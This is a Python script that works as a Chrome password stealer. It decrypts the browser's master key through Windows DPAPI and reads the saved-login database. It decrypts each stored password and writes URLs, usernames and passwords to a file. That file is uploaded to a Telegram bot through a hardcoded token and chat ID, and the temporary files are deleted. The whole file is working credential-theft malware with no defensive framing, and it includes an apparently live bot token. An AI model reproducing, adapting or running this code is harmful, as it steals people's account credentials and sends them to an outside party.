import os, json, base64, sqlite3, win32crypt, shutil, requests, getpass
from datetime import datetime, timedelta
from Crypto.Cipher import AES

TELEGRAM_BOT_TOKEN = "7733366488:AAHFBq_N1Ix-DFnzbw7nIrc_TDxZYo_hJME"
TELEGRAM_CHAT_ID = "6023417944"

def get_chrome_datetime(chromedate):
    return datetime(1601, 1, 1) + timedelta(microseconds=chromedate)

def get_encryption_key():
    path = os.path.join(os.environ["USERPROFILE"], "AppData", "Local", "Google", "Chrome", "User Data", "Local State")
    with open(path, "r", encoding="utf-8") as f:
        key = base64.b64decode(json.loads(f.read())["os_crypt"]["encrypted_key"])[5:]
    return win32crypt.CryptUnprotectData(key, None, None, None, 0)[1]

def decrypt_password(password, key):
    try:
        iv, payload = password[3:15], password[15:]
        cipher = AES.new(key, AES.MODE_GCM, iv)
        return cipher.decrypt(payload)[:-16].decode()
    except:
        return ""

def send_to_telegram(file_path):
    url = f"https://api.telegram.org/bot{TELEGRAM_BOT_TOKEN}/sendDocument"
    with open(file_path, "rb") as f:
        requests.post(url, data={"chat_id": TELEGRAM_CHAT_ID}, files={"document": f}, timeout=5)

def main():
    temp_dir = "C:\\Temp"
    os.makedirs(temp_dir, exist_ok=True)
    output_file = os.path.join(temp_dir, f"{getpass.getuser()}_Chrome_Passwords.txt")
    db_path = os.path.join(os.environ["USERPROFILE"], "AppData", "Local", "Google", "Chrome", "User Data", "Default", "Login Data")
    temp_db = os.path.join(temp_dir, "ChromeData.db")

    try:
        key = get_encryption_key()
        shutil.copyfile(db_path, temp_db)
        conn = sqlite3.connect(temp_db)
        cursor = conn.cursor()
        cursor.execute("SELECT origin_url, username_value, password_value, date_created, date_last_used FROM logins")
        output = []
        for row in cursor.fetchall():
            origin_url, username, password, date_created, date_last_used = row
            if username or password:
                password = decrypt_password(password, key)
                entry = f"Origin URL: {origin_url}\nUsername: {username}\nPassword: {password}\n"
                if date_created: entry += f"Created: {get_chrome_datetime(date_created)}\n"
                if date_last_used: entry += f"Last Used: {get_chrome_datetime(date_last_used)}\n"
                entry += "="*50 + "\n"
                output.append(entry)
        cursor.close()
        conn.close()
        os.remove(temp_db)

        if output:
            with open(output_file, "w", encoding="utf-8") as f:
                f.write("".join(output))
            send_to_telegram(output_file)
            os.remove(output_file)
    except Exception as e:
        print(f"Error: {e}")

if __name__ == "__main__":
    main()
